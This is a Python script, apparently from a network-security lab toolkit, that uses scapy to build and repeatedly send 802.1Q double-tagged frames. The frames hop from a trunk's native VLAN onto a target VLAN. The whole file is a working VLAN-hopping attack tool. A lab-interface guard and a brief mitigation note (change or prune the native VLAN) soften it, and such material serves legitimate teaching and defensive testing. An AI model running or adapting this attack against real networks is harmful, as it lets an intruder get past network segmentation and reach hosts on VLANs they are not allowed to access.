#!/usr/bin/env python3
"""VLAN: 802.1Q double-tagging hop — a trunk that treats the outer tag as
its native VLAN strips it in hardware, forwarding the inner-tagged frame
onto the target VLAN. Mitigation: change/park the native VLAN, drop it from
trunk links (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, iface_mac  # noqa: E402


def build_frame(scapy_all, native_vlan, target_vlan, src):
    Ether, Dot1Q, IP, ICMP = scapy_all.Ether, scapy_all.Dot1Q, scapy_all.IP, scapy_all.ICMP
    # A valid (non-zero) L2 source is required or the PNetLab link bridge drops
    # the frame before it reaches the trunk — see common.iface_mac(). The
    # injection comes from the attacker's real NIC MAC.
    return (Ether(src=src, dst="ff:ff:ff:ff:ff:ff") /
            Dot1Q(vlan=native_vlan) / Dot1Q(vlan=target_vlan) /
            IP(dst="255.255.255.255") / ICMP())


def main():
    p = base_parser("802.1Q double-tagged VLAN hop")
    p.add_argument("--target_vlan", type=int, default=20, help="inner (target) VLAN to land traffic on")
    p.add_argument("--native_vlan", type=int, default=1, help="outer tag — must match the trunk's native VLAN")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    src = iface_mac(args.iface)
    pkt = build_frame(scapy_all, args.native_vlan, args.target_vlan, src)
    if args.selftest:
        selftest_ok("vlan_hop", "double-tagged frame len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_frame(scapy_all, args.native_vlan, args.target_vlan, src), iface=args.iface, verbose=0)
        status("SENT", "double-tag #%d outer=%d inner=%d" % (n + 1, args.native_vlan, args.target_vlan))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

